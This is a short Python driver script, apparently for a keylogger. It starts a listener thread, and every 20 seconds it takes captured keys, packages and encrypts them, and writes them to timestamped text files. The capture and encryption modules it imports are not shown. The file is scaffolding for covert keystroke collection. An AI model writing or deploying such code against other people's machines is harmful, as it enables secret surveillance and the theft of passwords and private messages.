import threading
from time import sleep
from listener import Listener
from data_collector import Package
from time_stamp import time_stamp2
from encrypt import Encryption
from file_test import log

class Manager:
    def __init__(self):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)

    def start(self):
        self.process.start()

    def stop(self):
        self.listener.stop()


if __name__ == '__main__':

    p = Manager()
    p.start()
    while 1:
        sleep(20)
        data = p.listener.get_keys()
        if data:
            a = Package(data)
            b = a.export_package()
            e = Encryption()
            e.encrypt_text(str(b))
            s = e.encrypted
            print(b)
            print(s)
            times = f'{time_stamp2()}.txt'
            print(times)
            ett = str(s)
            log(times, ett)

